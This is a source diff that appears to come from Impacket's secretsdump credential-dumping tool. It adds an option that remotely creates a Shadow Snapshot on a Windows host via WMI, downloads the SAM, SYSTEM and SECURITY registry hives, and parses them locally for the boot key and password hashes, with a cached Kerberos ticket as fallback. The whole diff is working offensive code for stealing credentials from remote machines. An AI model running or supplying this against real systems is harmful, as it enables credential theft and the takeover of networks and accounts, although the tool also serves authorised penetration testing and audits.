@@ -113,6 +113,9 @@ class DumpSecrets:
         self.__resumeFileName = options.resumefile
         self.__canProcessSAMLSA = True
         self.__kdcHost = options.dc_ip
+        self.__remoteSSMethod = options.use_remoteSSMethod
+        self.__remoteSSMethodRemoteVolume = options.remoteSS_remote_volume
+        self.__remoteSSMethodDownloadPath = options.remoteSS_local_path
         self.__options = options
 
         if options.hashes is not None:
@@ -168,9 +171,44 @@ class DumpSecrets:
 
     def dump(self):
         try:
-            if self.__remoteName.upper() == 'LOCAL' and self.__username == '':
+            # Almost like LOCAL but create a Shadow Snapshot at target and download SAM, SYSTEM and SECURITY from the SS.
+            # Then, parse locally
+            if self.__remoteSSMethod:
                 self.__isRemote = False
                 self.__useVSSMethod = True
+                try:
+                    self.connect()
+                except Exception as e:
+                    if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
+                        # SMBConnection failed. That might be because there was no way to log into the
+                        # target system. We just have a last resort. Hope we have tickets cached and that they
+                        # will work
+                        logging.debug('SMBConnection didn\'t work, hoping Kerberos will help (%s)' % str(e))
+                        pass
+                    else:
+                        raise
+
+                # TESTING C:\\
+                # Should specify Volume with argument
+                self.__remoteOps = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost,
+                                                    self.__ldapConnection)
+                self.__remoteOps.setExecMethod(self.__options.exec_method)
+                sam_path, system_path, security_path = self.__remoteOps.createSSandDownload(self.__remoteSSMethodRemoteVolume,
+                                                                                            self.__remoteSSMethodDownloadPath)
+                self.__samHive = sam_path
+                self.__systemHive = system_path
+                self.__securityHive = security_path
+
+                localOperations = LocalOperations(self.__systemHive)
+                bootKey = localOperations.getBootKey()
+                if self.__ntdsFile is not None:
+                    # Let's grab target's configuration about LM Hashes storage
+                    self.__noLMHash = localOperations.checkNoLMHashPolicy()
+
+            elif self.__remoteName.upper() == 'LOCAL' and self.__username == '':
+                self.__isRemote = False
+                self.__useVSSMethod = True
+
                 if self.__systemHive:
                     localOperations = LocalOperations(self.__systemHive)
                     bootKey = localOperations.getBootKey()
@@ -371,13 +409,19 @@ if __name__ == '__main__':
     parser.add_argument('-outputfile', action='store',
                         help='base output filename. Extensions will be added for sam, secrets, cached and ntds')
     parser.add_argument('-use-vss', action='store_true', default=False,
-                        help='Use the VSS method instead of default DRSUAPI')
+                        help='Use the NTDSUTIL VSS method instead of default DRSUAPI')
     parser.add_argument('-rodcNo', action='store', type=int, help='Number of the RODC krbtgt account (only avaiable for Kerb-Key-List approach)')
     parser.add_argument('-rodcKey', action='store', help='AES key of the Read Only Domain Controller (only avaiable for Kerb-Key-List approach)')
     parser.add_argument('-use-keylist', action='store_true', default=False,
                         help='Use the Kerb-Key-List method instead of default DRSUAPI')
     parser.add_argument('-exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec', help='Remote exec '
                         'method to use at target (only when using -use-vss). Default: smbexec')
+    parser.add_argument('-use-remoteSSMethod', action='store_true',
+                        help='Remotely create Shadow Snapshot via WMI and download SAM, SYSTEM and SECURITY from it, the parse locally')
+    parser.add_argument('-remoteSS-remote-volume', action='store', default='C:\\',
+                        help='Remote Volume to perform the Shadow Snapshot and download SAM, SYSTEM and SECURITY')
+    parser.add_argument('-remoteSS-local-path', action='store', default='.',
+                        help='Path where download SAM, SYSTEM and SECURITY from Shadow Snapshot. It defaults to current path')
 
     group = parser.add_argument_group('display options')
     group.add_argument('-just-dc-user', action='store', metavar='USERNAME',
